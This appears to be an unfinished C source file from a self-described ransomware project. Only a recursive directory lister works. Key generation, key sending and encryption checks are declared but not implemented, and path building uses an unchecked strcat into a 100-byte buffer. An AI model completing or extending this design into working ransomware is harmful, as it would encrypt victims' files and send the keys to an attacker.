#include "ransomlib.h"
#include <dirent.h> // for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>



void usage()
{
	printf("--------------------------------------\n");
	printf("Bienvenue sur le projet de Ransomware\n");
	printf("--------------------------------------\n");
};

int is_encrypted(char *filename);

//void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
void listdir(const char *name)
{

    DIR* dir = opendir(name);
    if (dir == NULL)
    {
        return;
    }
    struct dirent* entity;
    entity = readdir(dir);

//    d_name = entity->d_name;
//    d_type = entity->d_type;

    while (entity != NULL)
    {
        printf("%s/%s  type of folder : %d\n",name,entity->d_name,entity->d_type);
        if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
        {
            //if(strcmp(d_name, ".")!=0)
           char path[100] = {0};
           strcat(path,name);
           strcat(path,"/");
           strcat(path,entity->d_name);
           listdir(path);
        }
        entity = readdir(dir);
    }
    closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[])
{
	usage();
	if(argc==1)
	{
		printf("./e <PATH>");
	}
	else if(argc==2)
	{
		printf("The directory is %s\n", argv[1]);
		listdir(argv[1]);
	}
}
